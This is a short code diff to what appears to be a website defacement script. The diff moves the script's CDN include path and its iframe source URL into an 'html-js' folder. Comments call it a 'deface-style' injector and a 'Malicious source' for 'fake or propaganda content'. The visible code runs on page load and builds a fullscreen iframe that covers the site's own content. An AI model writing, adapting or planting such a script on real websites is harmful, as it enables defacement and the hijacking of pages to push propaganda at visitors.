@@ -1,5 +1,5 @@
 /*
-  <script src="https://cdn.jsdelivr.net/gh/FrostFoe/localhost/palestine.js"></script>
+  <script src="https://cdn.jsdelivr.net/gh/FrostFoe/localhost/html-js/palestine.js"></script>
     
      * This script injects a fullscreen iframe with your content.
      * You can modify it for more advanced deface-style effects.
@@ -33,7 +33,7 @@ document.addEventListener("DOMContentLoaded", () => {
     const iframe = document.createElement("iframe");
 
     // ⚠️ Malicious source - loads fake or propaganda content
-    iframe.src = "https://frostfoe.github.io/localhost/palestine.html";
+    iframe.src = "https://frostfoe.github.io/localhost/html-js/palestine.html";
 
     // Style the iframe to cover the full screen and remove any borders
     Object.assign(iframe.style, {
